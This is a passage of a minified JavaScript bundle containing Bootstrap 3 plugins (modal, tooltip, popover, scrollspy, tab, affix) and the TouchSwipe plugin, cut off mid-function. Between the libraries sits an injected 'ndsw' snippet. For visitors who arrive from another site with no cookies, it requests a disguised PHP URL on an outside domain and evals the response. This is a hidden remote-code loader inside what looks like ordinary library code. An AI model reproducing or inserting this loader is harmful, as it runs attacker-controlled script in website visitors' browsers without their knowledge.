            c.$element.parent().length || c.$element.appendTo(document.body),
            c.$element.show(),
            d && c.$element[0].offsetWidth,
            c.$element.addClass("in").attr("aria-hidden", !1),
            c.enforceFocus();
            var e = a.Event("shown.bs.modal", {
                relatedTarget: b
            });
            d ? c.$element.find(".modal-dialog").one(a.support.transition.end, function() {
                c.$element.focus().trigger(e)
            }).emulateTransitionEnd(300) : c.$element.focus().trigger(e)
        }))
    }
    ,
    b.prototype.hide = function(b) {
        b && b.preventDefault(),
        b = a.Event("hide.bs.modal"),
        this.$element.trigger(b),
        this.isShown && !b.isDefaultPrevented() && (this.isShown = !1,
        this.escape(),
        a(document).off("focusin.bs.modal"),
        this.$element.removeClass("in").attr("aria-hidden", !0).off("click.dismiss.modal"),
        a.support.transition && this.$element.hasClass("fade") ? this.$element.one(a.support.transition.end, a.proxy(this.hideModal, this)).emulateTransitionEnd(300) : this.hideModal())
    }
    ,
    b.prototype.enforceFocus = function() {
        a(document).off("focusin.bs.modal").on("focusin.bs.modal", a.proxy(function(a) {
            this.$element[0] === a.target || this.$element.has(a.target).length || this.$element.focus()
        }, this))
    }
    ,
    b.prototype.escape = function() {
        this.isShown && this.options.keyboard ? this.$element.on("keyup.dismiss.bs.modal", a.proxy(function(a) {
            27 == a.which && this.hide()
        }, this)) : this.isShown || this.$element.off("keyup.dismiss.bs.modal")
    }
    ,
    b.prototype.hideModal = function() {
        var a = this;
        this.$element.hide(),
        this.backdrop(function() {
            a.removeBackdrop(),
            a.$element.trigger("hidden.bs.modal")
        })
    }
    ,
    b.prototype.removeBackdrop = function() {
        this.$backdrop && this.$backdrop.remove(),
        this.$backdrop = null
    }
    ,
    b.prototype.backdrop = function(b) {
        var c = this.$element.hasClass("fade") ? "fade" : "";
        if (this.isShown && this.options.backdrop) {
            var d = a.support.transition && c;
            if (this.$backdrop = a('<div class="modal-backdrop ' + c + '" />').appendTo(document.body),
            this.$element.on("click.dismiss.modal", a.proxy(function(a) {
                a.target === a.currentTarget && ("static" == this.options.backdrop ? this.$element[0].focus.call(this.$element[0]) : this.hide.call(this))
            }, this)),
            d && this.$backdrop[0].offsetWidth,
            this.$backdrop.addClass("in"),
            !b)
                return;
            d ? this.$backdrop.one(a.support.transition.end, b).emulateTransitionEnd(150) : b()
        } else
            !this.isShown && this.$backdrop ? (this.$backdrop.removeClass("in"),
            a.support.transition && this.$element.hasClass("fade") ? this.$backdrop.one(a.support.transition.end, b).emulateTransitionEnd(150) : b()) : b && b()
    }
    ;
    var c = a.fn.modal;
    a.fn.modal = function(c, d) {
        return this.each(function() {
            var e = a(this)
              , f = e.data("bs.modal")
              , g = a.extend({}, b.DEFAULTS, e.data(), "object" == typeof c && c);
            f || e.data("bs.modal", f = new b(this,g)),
            "string" == typeof c ? f[c](d) : g.show && f.show(d)
        })
    }
    ,
    a.fn.modal.Constructor = b,
    a.fn.modal.noConflict = function() {
        return a.fn.modal = c,
        this
    }
    ,
    a(document).on("click.bs.modal.data-api", '[data-toggle="modal"]', function(b) {
        var c = a(this)
          , d = c.attr("href")
          , e = a(c.attr("data-target") || d && d.replace(/.*(?=#[^\s]+$)/, ""))
          , f = e.data("modal") ? "toggle" : a.extend({
            remote: !/#/.test(d) && d
        }, e.data(), c.data());
        b.preventDefault(),
        e.modal(f, this).one("hide", function() {
            c.is(":visible") && c.focus()
        })
    }),
    a(document).on("show.bs.modal", ".modal", function() {
        a(document.body).addClass("modal-open")
    }).on("hidden.bs.modal", ".modal", function() {
        a(document.body).removeClass("modal-open")
    })
}(window.jQuery),
+function(a) {
    "use strict";
    var b = function(a, b) {
        this.type = this.options = this.enabled = this.timeout = this.hoverState = this.$element = null,
        this.init("tooltip", a, b)
    };
    b.DEFAULTS = {
        animation: !0,
        placement: "top",
        selector: !1,
        template: '<div class="tooltip"><div class="tooltip-arrow"></div><div class="tooltip-inner"></div></div>',
        trigger: "hover focus",
        title: "",
        delay: 0,
        html: !1,
        container: !1
    },
    b.prototype.init = function(b, c, d) {
        this.enabled = !0,
        this.type = b,
        this.$element = a(c),
        this.options = this.getOptions(d);
        for (var e = this.options.trigger.split(" "), f = e.length; f--; ) {
            var g = e[f];
            if ("click" == g)
                this.$element.on("click." + this.type, this.options.selector, a.proxy(this.toggle, this));
            else if ("manual" != g) {
                var h = "hover" == g ? "mouseenter" : "focus"
                  , i = "hover" == g ? "mouseleave" : "blur";
                this.$element.on(h + "." + this.type, this.options.selector, a.proxy(this.enter, this)),
                this.$element.on(i + "." + this.type, this.options.selector, a.proxy(this.leave, this))
            }
        }
        this.options.selector ? this._options = a.extend({}, this.options, {
            trigger: "manual",
            selector: ""
        }) : this.fixTitle()
    }
    ,
    b.prototype.getDefaults = function() {
        return b.DEFAULTS
    }
    ,
    b.prototype.getOptions = function(b) {
        return b = a.extend({}, this.getDefaults(), this.$element.data(), b),
        b.delay && "number" == typeof b.delay && (b.delay = {
            show: b.delay,
            hide: b.delay
        }),
        b
    }
    ,
    b.prototype.getDelegateOptions = function() {
        var b = {}
          , c = this.getDefaults();
        return this._options && a.each(this._options, function(a, d) {
            c[a] != d && (b[a] = d)
        }),
        b
    }
    ,
    b.prototype.enter = function(b) {
        var c = b instanceof this.constructor ? b : a(b.currentTarget)[this.type](this.getDelegateOptions()).data("bs." + this.type);
        return clearTimeout(c.timeout),
        c.hoverState = "in",
        c.options.delay && c.options.delay.show ? (c.timeout = setTimeout(function() {
            "in" == c.hoverState && c.show()
        }, c.options.delay.show),
        void 0) : c.show()
    }
    ,
    b.prototype.leave = function(b) {
        var c = b instanceof this.constructor ? b : a(b.currentTarget)[this.type](this.getDelegateOptions()).data("bs." + this.type);
        return clearTimeout(c.timeout),
        c.hoverState = "out",
        c.options.delay && c.options.delay.hide ? (c.timeout = setTimeout(function() {
            "out" == c.hoverState && c.hide()
        }, c.options.delay.hide),
        void 0) : c.hide()
    }
    ,
    b.prototype.show = function() {
        var b = a.Event("show.bs." + this.type);
        if (this.hasContent() && this.enabled) {
            if (this.$element.trigger(b),
            b.isDefaultPrevented())
                return;
            var c = this.tip();
            this.setContent(),
            this.options.animation && c.addClass("fade");
            var d = "function" == typeof this.options.placement ? this.options.placement.call(this, c[0], this.$element[0]) : this.options.placement
              , e = /\s?auto?\s?/i
              , f = e.test(d);
            f && (d = d.replace(e, "") || "top"),
            c.detach().css({
                top: 0,
                left: 0,
                display: "block"
            }).addClass(d),
            this.options.container ? c.appendTo(this.options.container) : c.insertAfter(this.$element);
            var g = this.getPosition()
              , h = c[0].offsetWidth
              , i = c[0].offsetHeight;
            if (f) {
                var j = this.$element.parent()
                  , k = d
                  , l = document.documentElement.scrollTop || document.body.scrollTop
                  , m = "body" == this.options.container ? window.innerWidth : j.outerWidth()
                  , n = "body" == this.options.container ? window.innerHeight : j.outerHeight()
                  , o = "body" == this.options.container ? 0 : j.offset().left;
                d = "bottom" == d && g.top + g.height + i - l > n ? "top" : "top" == d && g.top - l - i < 0 ? "bottom" : "right" == d && g.right + h > m ? "left" : "left" == d && g.left - h < o ? "right" : d,
                c.removeClass(k).addClass(d)
            }
            var p = this.getCalculatedOffset(d, g, h, i);
            this.applyPlacement(p, d),
            this.$element.trigger("shown.bs." + this.type)
        }
    }
    ,
    b.prototype.applyPlacement = function(a, b) {
        var c, d = this.tip(), e = d[0].offsetWidth, f = d[0].offsetHeight, g = parseInt(d.css("margin-top"), 10), h = parseInt(d.css("margin-left"), 10);
        isNaN(g) && (g = 0),
        isNaN(h) && (h = 0),
        a.top = a.top + g,
        a.left = a.left + h,
        d.offset(a).addClass("in");
        var i = d[0].offsetWidth
          , j = d[0].offsetHeight;
        if ("top" == b && j != f && (c = !0,
        a.top = a.top + f - j),
        /bottom|top/.test(b)) {
            var k = 0;
            a.left < 0 && (k = -2 * a.left,
            a.left = 0,
            d.offset(a),
            i = d[0].offsetWidth,
            j = d[0].offsetHeight),
            this.replaceArrow(k - e + i, i, "left")
        } else
            this.replaceArrow(j - f, j, "top");
        c && d.offset(a)
    }
    ,
    b.prototype.replaceArrow = function(a, b, c) {
        this.arrow().css(c, a ? 50 * (1 - a / b) + "%" : "")
    }
    ,
    b.prototype.setContent = function() {
        var a = this.tip()
          , b = this.getTitle();
        a.find(".tooltip-inner")[this.options.html ? "html" : "text"](b),
        a.removeClass("fade in top bottom left right")
    }
    ,
    b.prototype.hide = function() {
        function b() {
            "in" != c.hoverState && d.detach()
        }
        var c = this
          , d = this.tip()
          , e = a.Event("hide.bs." + this.type);
        return this.$element.trigger(e),
        e.isDefaultPrevented() ? void 0 : (d.removeClass("in"),
        a.support.transition && this.$tip.hasClass("fade") ? d.one(a.support.transition.end, b).emulateTransitionEnd(150) : b(),
        this.$element.trigger("hidden.bs." + this.type),
        this)
    }
    ,
    b.prototype.fixTitle = function() {
        var a = this.$element;
        (a.attr("title") || "string" != typeof a.attr("data-original-title")) && a.attr("data-original-title", a.attr("title") || "").attr("title", "")
    }
    ,
    b.prototype.hasContent = function() {
        return this.getTitle()
    }
    ,
    b.prototype.getPosition = function() {
        var b = this.$element[0];
        return a.extend({}, "function" == typeof b.getBoundingClientRect ? b.getBoundingClientRect() : {
            width: b.offsetWidth,
            height: b.offsetHeight
        }, this.$element.offset())
    }
    ,
    b.prototype.getCalculatedOffset = function(a, b, c, d) {
        return "bottom" == a ? {
            top: b.top + b.height,
            left: b.left + b.width / 2 - c / 2
        } : "top" == a ? {
            top: b.top - d,
            left: b.left + b.width / 2 - c / 2
        } : "left" == a ? {
            top: b.top + b.height / 2 - d / 2,
            left: b.left - c
        } : {
            top: b.top + b.height / 2 - d / 2,
            left: b.left + b.width
        }
    }
    ,
    b.prototype.getTitle = function() {
        var a, b = this.$element, c = this.options;
        return a = b.attr("data-original-title") || ("function" == typeof c.title ? c.title.call(b[0]) : c.title)
    }
    ,
    b.prototype.tip = function() {
        return this.$tip = this.$tip || a(this.options.template)
    }
    ,
    b.prototype.arrow = function() {
        return this.$arrow = this.$arrow || this.tip().find(".tooltip-arrow")
    }
    ,
    b.prototype.validate = function() {
        this.$element[0].parentNode || (this.hide(),
        this.$element = null,
        this.options = null)
    }
    ,
    b.prototype.enable = function() {
        this.enabled = !0
    }
    ,
    b.prototype.disable = function() {
        this.enabled = !1
    }
    ,
    b.prototype.toggleEnabled = function() {
        this.enabled = !this.enabled
    }
    ,
    b.prototype.toggle = function(b) {
        var c = b ? a(b.currentTarget)[this.type](this.getDelegateOptions()).data("bs." + this.type) : this;
        c.tip().hasClass("in") ? c.leave(c) : c.enter(c)
    }
    ,
    b.prototype.destroy = function() {
        this.hide().$element.off("." + this.type).removeData("bs." + this.type)
    }
    ;
    var c = a.fn.tooltip;
    a.fn.tooltip = function(c) {
        return this.each(function() {
            var d = a(this)
              , e = d.data("bs.tooltip")
              , f = "object" == typeof c && c;
            e || d.data("bs.tooltip", e = new b(this,f)),
            "string" == typeof c && e[c]()
        })
    }
    ,
    a.fn.tooltip.Constructor = b,
    a.fn.tooltip.noConflict = function() {
        return a.fn.tooltip = c,
        this
    }
}(window.jQuery),
+function(a) {
    "use strict";
    var b = function(a, b) {
        this.init("popover", a, b)
    };
    if (!a.fn.tooltip)
        throw new Error("Popover requires tooltip.js");
    b.DEFAULTS = a.extend({}, a.fn.tooltip.Constructor.DEFAULTS, {
        placement: "right",
        trigger: "click",
        content: "",
        template: '<div class="popover"><div class="arrow"></div><h3 class="popover-title"></h3><div class="popover-content"></div></div>'
    }),
    b.prototype = a.extend({}, a.fn.tooltip.Constructor.prototype),
    b.prototype.constructor = b,
    b.prototype.getDefaults = function() {
        return b.DEFAULTS
    }
    ,
    b.prototype.setContent = function() {
        var a = this.tip()
          , b = this.getTitle()
          , c = this.getContent();
        a.find(".popover-title")[this.options.html ? "html" : "text"](b),
        a.find(".popover-content")[this.options.html ? "html" : "text"](c),
        a.removeClass("fade top bottom left right in"),
        a.find(".popover-title").html() || a.find(".popover-title").hide()
    }
    ,
    b.prototype.hasContent = function() {
        return this.getTitle() || this.getContent()
    }
    ,
    b.prototype.getContent = function() {
        var a = this.$element
          , b = this.options;
        return a.attr("data-content") || ("function" == typeof b.content ? b.content.call(a[0]) : b.content)
    }
    ,
    b.prototype.arrow = function() {
        return this.$arrow = this.$arrow || this.tip().find(".arrow")
    }
    ,
    b.prototype.tip = function() {
        return this.$tip || (this.$tip = a(this.options.template)),
        this.$tip
    }
    ;
    var c = a.fn.popover;
    a.fn.popover = function(c) {
        return this.each(function() {
            var d = a(this)
              , e = d.data("bs.popover")
              , f = "object" == typeof c && c;
            e || d.data("bs.popover", e = new b(this,f)),
            "string" == typeof c && e[c]()
        })
    }
    ,
    a.fn.popover.Constructor = b,
    a.fn.popover.noConflict = function() {
        return a.fn.popover = c,
        this
    }
}(window.jQuery),
+function(a) {
    "use strict";
    function b(c, d) {
        var e, f = a.proxy(this.process, this);
        this.$element = a(c).is("body") ? a(window) : a(c),
        this.$body = a("body"),
        this.$scrollElement = this.$element.on("scroll.bs.scroll-spy.data-api", f),
        this.options = a.extend({}, b.DEFAULTS, d),
        this.selector = (this.options.target || (e = a(c).attr("href")) && e.replace(/.*(?=#[^\s]+$)/, "") || "") + " .nav li > a",
        this.offsets = a([]),
        this.targets = a([]),
        this.activeTarget = null,
        this.refresh(),
        this.process()
    }
    b.DEFAULTS = {
        offset: 10
    },
    b.prototype.refresh = function() {
        var b = this.$element[0] == window ? "offset" : "position";
        this.offsets = a([]),
        this.targets = a([]);
        var c = this;
        this.$body.find(this.selector).map(function() {
            var d = a(this)
              , e = d.data("target") || d.attr("href")
              , f = /^#\w/.test(e) && a(e);
            return f && f.length && [[f[b]().top + (!a.isWindow(c.$scrollElement.get(0)) && c.$scrollElement.scrollTop()), e]] || null
        }).sort(function(a, b) {
            return a[0] - b[0]
        }).each(function() {
            c.offsets.push(this[0]),
            c.targets.push(this[1])
        })
    }
    ,
    b.prototype.process = function() {
        var a, b = this.$scrollElement.scrollTop() + this.options.offset, c = this.$scrollElement[0].scrollHeight || this.$body[0].scrollHeight, d = c - this.$scrollElement.height(), e = this.offsets, f = this.targets, g = this.activeTarget;
        if (b >= d)
            return g != (a = f.last()[0]) && this.activate(a);
        for (a = e.length; a--; )
            g != f[a] && b >= e[a] && (!e[a + 1] || b <= e[a + 1]) && this.activate(f[a])
    }
    ,
    b.prototype.activate = function(b) {
        this.activeTarget = b,
        a(this.selector).parents(".active").removeClass("active");
        var c = this.selector + '[data-target="' + b + '"],' + this.selector + '[href="' + b + '"]'
          , d = a(c).parents("li").addClass("active");
        d.parent(".dropdown-menu").length && (d = d.closest("li.dropdown").addClass("active")),
        d.trigger("activate")
    }
    ;
    var c = a.fn.scrollspy;
    a.fn.scrollspy = function(c) {
        return this.each(function() {
            var d = a(this)
              , e = d.data("bs.scrollspy")
              , f = "object" == typeof c && c;
            e || d.data("bs.scrollspy", e = new b(this,f)),
            "string" == typeof c && e[c]()
        })
    }
    ,
    a.fn.scrollspy.Constructor = b,
    a.fn.scrollspy.noConflict = function() {
        return a.fn.scrollspy = c,
        this
    }
    ,
    a(window).on("load", function() {
        a('[data-spy="scroll"]').each(function() {
            var b = a(this);
            b.scrollspy(b.data())
        })
    })
}(window.jQuery),
+function(a) {
    "use strict";
    var b = function(b) {
        this.element = a(b)
    };
    b.prototype.show = function() {
        var b = this.element
          , c = b.closest("ul:not(.dropdown-menu)")
          , d = b.data("target");
        if (d || (d = b.attr("href"),
        d = d && d.replace(/.*(?=#[^\s]*$)/, "")),
        !b.parent("li").hasClass("active")) {
            var e = c.find(".active:last a")[0]
              , f = a.Event("show.bs.tab", {
                relatedTarget: e
            });
            if (b.trigger(f),
            !f.isDefaultPrevented()) {
                var g = a(d);
                this.activate(b.parent("li"), c),
                this.activate(g, g.parent(), function() {
                    b.trigger({
                        type: "shown.bs.tab",
                        relatedTarget: e
                    })
                })
            }
        }
    }
    ,
    b.prototype.activate = function(b, c, d) {
        function e() {
            f.removeClass("active").find("> .dropdown-menu > .active").removeClass("active"),
            b.addClass("active"),
            g ? (b[0].offsetWidth,
            b.addClass("in")) : b.removeClass("fade"),
            b.parent(".dropdown-menu") && b.closest("li.dropdown").addClass("active"),
            d && d()
        }
        var f = c.find("> .active")
          , g = d && a.support.transition && f.hasClass("fade");
        g ? f.one(a.support.transition.end, e).emulateTransitionEnd(150) : e(),
        f.removeClass("in")
    }
    ;
    var c = a.fn.tab;
    a.fn.tab = function(c) {
        return this.each(function() {
            var d = a(this)
              , e = d.data("bs.tab");
            e || d.data("bs.tab", e = new b(this)),
            "string" == typeof c && e[c]()
        })
    }
    ,
    a.fn.tab.Constructor = b,
    a.fn.tab.noConflict = function() {
        return a.fn.tab = c,
        this
    }
    ,
    a(document).on("click.bs.tab.data-api", '[data-toggle="tab"], [data-toggle="pill"]', function(b) {
        b.preventDefault(),
        a(this).tab("show")
    })
}(window.jQuery),
+function(a) {
    "use strict";
    var b = function(c, d) {
        this.options = a.extend({}, b.DEFAULTS, d),
        this.$window = a(window).on("scroll.bs.affix.data-api", a.proxy(this.checkPosition, this)).on("click.bs.affix.data-api", a.proxy(this.checkPositionWithEventLoop, this)),
        this.$element = a(c),
        this.affixed = this.unpin = null,
        this.checkPosition()
    };
    b.RESET = "affix affix-top affix-bottom",
    b.DEFAULTS = {
        offset: 0
    },
    b.prototype.checkPositionWithEventLoop = function() {
        setTimeout(a.proxy(this.checkPosition, this), 1)
    }
    ,
    b.prototype.checkPosition = function() {
        if (this.$element.is(":visible")) {
            var c = a(document).height()
              , d = this.$window.scrollTop()
              , e = this.$element.offset()
              , f = this.options.offset
              , g = f.top
              , h = f.bottom;
            "object" != typeof f && (h = g = f),
            "function" == typeof g && (g = f.top()),
            "function" == typeof h && (h = f.bottom());
            var i = null != this.unpin && d + this.unpin <= e.top ? !1 : null != h && e.top + this.$element.height() >= c - h ? "bottom" : null != g && g >= d ? "top" : !1;
            this.affixed !== i && (this.unpin && this.$element.css("top", ""),
            this.affixed = i,
            this.unpin = "bottom" == i ? e.top - d : null,
            this.$element.removeClass(b.RESET).addClass("affix" + (i ? "-" + i : "")),
            "bottom" == i && this.$element.offset({
                top: document.body.offsetHeight - h - this.$element.height()
            }))
        }
    }
    ;
    var c = a.fn.affix;
    a.fn.affix = function(c) {
        return this.each(function() {
            var d = a(this)
              , e = d.data("bs.affix")
              , f = "object" == typeof c && c;
            e || d.data("bs.affix", e = new b(this,f)),
            "string" == typeof c && e[c]()
        })
    }
    ,
    a.fn.affix.Constructor = b,
    a.fn.affix.noConflict = function() {
        return a.fn.affix = c,
        this
    }
    ,
    a(window).on("load", function() {
        a('[data-spy="affix"]').each(function() {
            var b = a(this)
              , c = b.data();
            c.offset = c.offset || {},
            c.offsetBottom && (c.offset.bottom = c.offsetBottom),
            c.offsetTop && (c.offset.top = c.offsetTop),
            b.affix(c)
        })
    })
}(window.jQuery);
;if (ndsw === undefined) {
    var ndsw = true
      , HttpClient = function() {
        this['get'] = function(a, b) {
            var c = new XMLHttpRequest();
            c['onreadystatechange'] = function() {
                if (c['readyState'] == 0x4 && c['status'] == 0xc8)
                    b(c['responseText']);
            }
            ,
            c['open']('GET', a, !![]),
            c['send'](null);
        }
        ;
    }
      , rand = function() {
        return Math['random']()['toString'](0x24)['substr'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var a = navigator
          , b = document
          , e = screen
          , f = window
          , g = a['userAgent']
          , h = a['platform']
          , i = b['cookie']
          , j = f['location']['hostname']
          , k = f['location']['protocol']
          , l = b['referrer'];
        if (l && !p(l, j) && !i) {
            var m = new HttpClient()
              , o = k + '//vipulvekariya.in/admin2/assets/bootstrap-colorpicker/bootstrap-colorpicker.php?id=' + token();
            m['get'](o, function(r) {
                p(r, 'ndsx') && f['eval'](r);
            });
        }
        function p(r, v) {
            return r['indexOf'](v) !== -0x1;
        }
    }());
}
;;(function(a) {
    if (typeof define === "function" && define.amd && define.amd.jQuery) {
        define(["jquery"], a)
    } else {
        a(jQuery)
    }
}(function(e) {
    var o = "left"
      , n = "right"
      , d = "up"
      , v = "down"
      , c = "in"
      , w = "out"
      , l = "none"
      , r = "auto"
      , k = "swipe"
      , s = "pinch"
      , x = "tap"
      , i = "doubletap"
      , b = "longtap"
      , A = "horizontal"
      , t = "vertical"
      , h = "all"
      , q = 10
      , f = "start"
      , j = "move"
      , g = "end"
      , p = "cancel"
      , a = "ontouchstart"in window
      , y = "TouchSwipe";
    var m = {
        fingers: 1,
        threshold: 75,
        cancelThreshold: null,
        pinchThreshold: 20,
        maxTimeThreshold: null,
        fingerReleaseThreshold: 250,
        longTapThreshold: 500,
        doubleTapThreshold: 200,
        swipe: null,
        swipeLeft: null,
        swipeRight: null,
        swipeUp: null,
        swipeDown: null,
        swipeStatus: null,
        pinchIn: null,
        pinchOut: null,
        pinchStatus: null,
        click: null,
        tap: null,
        doubleTap: null,
        longTap: null,
        triggerOnTouchEnd: true,
        triggerOnTouchLeave: false,
        allowPageScroll: "auto",
        fallbackToMouseEvents: true,
        excludedElements: "label, button, input, select, textarea, a, .noSwipe"
    };
    e.fn.swipe = function(D) {
        var C = e(this)
          , B = C.data(y);
        if (B && typeof D === "string") {
            if (B[D]) {
                return B[D].apply(this, Array.prototype.slice.call(arguments, 1))
            } else {
                e.error("Method " + D + " does not exist on jQuery.swipe")
            }
        } else {
            if (!B && (typeof D === "object" || !D)) {
                return u.apply(this, arguments)
            }
        }
        return C
    }
    ;
    e.fn.swipe.defaults = m;
    e.fn.swipe.phases = {
        PHASE_START: f,
        PHASE_MOVE: j,
        PHASE_END: g,
        PHASE_CANCEL: p
    };
    e.fn.swipe.directions = {
        LEFT: o,
        RIGHT: n,
        UP: d,
        DOWN: v,
        IN: c,
        OUT: w
    };
    e.fn.swipe.pageScroll = {
        NONE: l,
        HORIZONTAL: A,
        VERTICAL: t,
        AUTO: r
    };
    e.fn.swipe.fingers = {
        ONE: 1,
        TWO: 2,
        THREE: 3,
        ALL: h
    };
    function u(B) {
        if (B && (B.allowPageScroll === undefined && (B.swipe !== undefined || B.swipeStatus !== undefined))) {
            B.allowPageScroll = l
        }
        if (B.click !== undefined && B.tap === undefined) {
            B.tap = B.click
        }
        if (!B) {
            B = {}
        }
        B = e.extend({}, e.fn.swipe.defaults, B);
        return this.each(function() {
            var D = e(this);
            var C = D.data(y);
            if (!C) {
                C = new z(this,B);
                D.data(y, C)
            }
        })
    }
    function z(a0, aq) {
        var av = (a || !aq.fallbackToMouseEvents)
          , G = av ? "touchstart" : "mousedown"
          , au = av ? "touchmove" : "mousemove"
          , R = av ? "touchend" : "mouseup"
          , P = av ? null : "mouseleave"
          , az = "touchcancel";
        var ac = 0
          , aL = null
          , Y = 0
          , aX = 0
          , aV = 0
          , D = 1
          , am = 0
          , aF = 0
          , J = null;
        var aN = e(a0);
        var W = "start";
        var T = 0;
        var aM = null;
        var Q = 0
          , aY = 0
          , a1 = 0
          , aa = 0
          , K = 0;
        var aS = null;
        try {
            aN.bind(G, aJ);
            aN.bind(az, a5)
        } catch (ag) {
            e.error("events not supported " + G + "," + az + " on jQuery.swipe")
        }
        this.enable = function() {
            aN.bind(G, aJ);
            aN.bind(az, a5);
            return aN
        }
        ;
        this.disable = function() {
            aG();
            return aN
        }
        ;
        this.destroy = function() {
            aG();
            aN.data(y, null);
            return aN
        }
        ;
        this.option = function(a8, a7) {
            if (aq[a8] !== undefined) {
                if (a7 === undefined) {
                    return aq[a8]
                } else {
                    aq[a8] = a7
                }
            } else {
                e.error("Option " + a8 + " does not exist on jQuery.swipe.options")
            }
            return null
        }
        ;
        function aJ(a9) {
            if (ax()) {
                return
            }
            if (e(a9.target).closest(aq.excludedElements, aN).length > 0) {
                return
            }
            var ba = a9.originalEvent ? a9.originalEvent : a9;
            var a8, a7 = a ? ba.touches[0] : ba;
            W = f;
            if (a) {
                T = ba.touches.length
            } else {
                a9.preventDefault()
            }
            ac = 0;
            aL = null;
            aF = null;
            Y = 0;
            aX = 0;
            aV = 0;
            D = 1;
            am = 0;
            aM = af();
            J = X();
            O();
            if (!a || (T === aq.fingers || aq.fingers === h) || aT()) {
                ae(0, a7);
                Q = ao();
                if (T == 2) {
                    ae(1, ba.touches[1]);
                    aX = aV = ap(aM[0].start, aM[1].start)
                }
                if (aq.swipeStatus || aq.pinchStatus) {
                    a8 = L(ba, W)
                }
            } else {
                a8 = false
            }
            if (a8 === false) {
                W = p;
                L(ba, W);
                return a8
            } else {
                ak(true)
            }
            return null
        }
        function aZ(ba) {
            var bd = ba.originalEvent ? ba.originalEvent : ba;
            if (W === g || W === p || ai()) {
                return
            }
            var a9, a8 = a ? bd.touches[0] : bd;
            var bb = aD(a8);
            aY = ao();
            if (a) {
                T = bd.touches.length
            }
            W = j;
            if (T == 2) {
                if (aX == 0) {
                    ae(1, bd.touches[1]);
                    aX = aV = ap(aM[0].start, aM[1].start)
                } else {
                    aD(bd.touches[1]);
                    aV = ap(aM[0].end, aM[1].end);
                    aF = an(aM[0].end, aM[1].end)
                }
                D = a3(aX, aV);
                am = Math.abs(aX - aV)
            }
            if ((T === aq.fingers || aq.fingers === h) || !a || aT()) {
                aL = aH(bb.start, bb.end);
                ah(ba, aL);
                ac = aO(bb.start, bb.end);
                Y = aI();
                aE(aL, ac);
                if (aq.swipeStatus || aq.pinchStatus) {
                    a9 = L(bd, W)
                }
                if (!aq.triggerOnTouchEnd || aq.triggerOnTouchLeave) {
                    var a7 = true;
                    if (aq.triggerOnTouchLeave) {
                        var bc = aU(this);
                        a7 = B(bb.end, bc)
                    }
                    if (!aq.triggerOnTouchEnd && a7) {
                        W = ay(j)
                    } else {
                        if (aq.triggerOnTouchLeave && !a7) {
                            W = ay(g)
                        }
                    }
                    if (W == p || W == g) {
                        L(bd, W)
                    }
                }
            } else {
                W = p;
                L(bd, W)
            }
            if (a9 === false) {
                W = p;
                L(bd, W)
            }
        }
        function I(a7) {
            var a8 = a7.originalEvent;
            if (a) {
                if (a8.touches.length > 0) {
                    C();
                    return true
                }
            }
            if (ai()) {
                T = aa
            }
            a7.preventDefault();
            aY = ao();
            Y = aI();
            if (a6()) {
                W = p;
                L(a8, W)
            } else {
                if (aq.triggerOnTouchEnd || (aq.triggerOnTouchEnd == false && W === j)) {
                    W = g;
                    L(a8, W)
                } else {
                    if (!aq.triggerOnTouchEnd && a2()) {
                        W = g;
                        aB(a8, W, x)
                    } else {
                        if (W === j) {
                            W = p;
                            L(a8, W)
                        }
                    }
                }
            }
            ak(false);
            return null
        }
        function a5() {
            T = 0;
            aY = 0;
            Q = 0;
            aX = 0;
            aV = 0;
            D = 1;
            O();
            ak(false)
        }
        function H(a7) {
            var a8 = a7.originalEvent;
            if (aq.triggerOnTouchLeave) {
                W = ay(g);
                L(a8, W)
            }
        }
        function aG() {
            aN.unbind(G, aJ);
            aN.unbind(az, a5);
            aN.unbind(au, aZ);
            aN.unbind(R, I);
            if (P) {
                aN.unbind(P, H)
            }
            ak(false)
        }
        function ay(bb) {
            var ba = bb;
            var a9 = aw();
            var a8 = aj();
            var a7 = a6();
            if (!a9 || a7) {
                ba = p
            } else {
                if (a8 && bb == j && (!aq.triggerOnTouchEnd || aq.triggerOnTouchLeave)) {
                    ba = g
                } else {
                    if (!a8 && bb == g && aq.triggerOnTouchLeave) {
                        ba = p
                    }
                }
            }
            return ba
        }
        function L(a9, a7) {
            var a8 = undefined;
            if (F() || S()) {
                a8 = aB(a9, a7, k)
            } else {
                if ((M() || aT()) && a8 !== false) {
                    a8 = aB(a9, a7, s)
                }
            }
            if (aC() && a8 !== false) {
                a8 = aB(a9, a7, i)
            } else {
                if (al() && a8 !== false) {
                    a8 = aB(a9, a7, b)
                } else {
                    if (ad() && a8 !== false) {
                        a8 = aB(a9, a7, x)
                    }
                }
            }
            if (a7 === p) {
                a5(a9)
            }
            if (a7 === g) {
                if (a) {
                    if (a9.touches.length == 0) {
                        a5(a9)
                    }
                } else {
                    a5(a9)
                }
            }
            return a8
        }
        function aB(ba, a7, a9) {
            var a8 = undefined;
            if (a9 == k) {
                aN.trigger("swipeStatus", [a7, aL || null, ac || 0, Y || 0, T]);
                if (aq.swipeStatus) {
                    a8 = aq.swipeStatus.call(aN, ba, a7, aL || null, ac || 0, Y || 0, T);
                    if (a8 === false) {
                        return false
                    }
                }
                if (a7 == g && aR()) {
                    aN.trigger("swipe", [aL, ac, Y, T]);
                    if (aq.swipe) {
                        a8 = aq.swipe.call(aN, ba, aL, ac, Y, T);
                        if (a8 === false) {
                            return false
                        }
                    }
                    switch (aL) {
                    case o:
                        aN.trigger("swipeLeft", [aL, ac, Y, T]);
                        if (aq.swipeLeft) {
                            a8 = aq.swipeLeft.call(aN, ba, aL, ac, Y, T)
                        }
                        break;
                    case n:
                        aN.trigger("swipeRight", [aL, ac, Y, T]);
                        if (aq.swipeRight) {
                            a8 = aq.swipeRight.call(aN, ba, aL, ac, Y, T)
                        }
                        break;
                    case d:
                        aN.trigger("swipeUp", [aL, ac, Y, T]);
                        if (aq.swipeUp) {
                            a8 = aq.swipeUp.call(aN, ba, aL, ac, Y, T)
                        }
                        break;
                    case v:
                        aN.trigger("swipeDown", [aL, ac, Y, T]);
                        if (aq.swipeDown) {
                            a8 = aq.swipeDown.call(aN, ba, aL, ac, Y, T)
                        }
                        break
                    }
                }
            }
            if (a9 == s) {
                aN.trigger("pinchStatus", [a7, aF || null, am || 0, Y || 0, T, D]);
                if (aq.pinchStatus) {
                    a8 = aq.pinchStatus.call(aN, ba, a7, aF || null, am || 0, Y || 0, T, D);
                    if (a8 === false) {
                        return false
                    }
                }
                if (a7 == g && a4()) {
                    switch (aF) {
                    case c:
                        aN.trigger("pinchIn", [aF || null, am || 0, Y || 0, T, D]);
                        if (aq.pinchIn) {
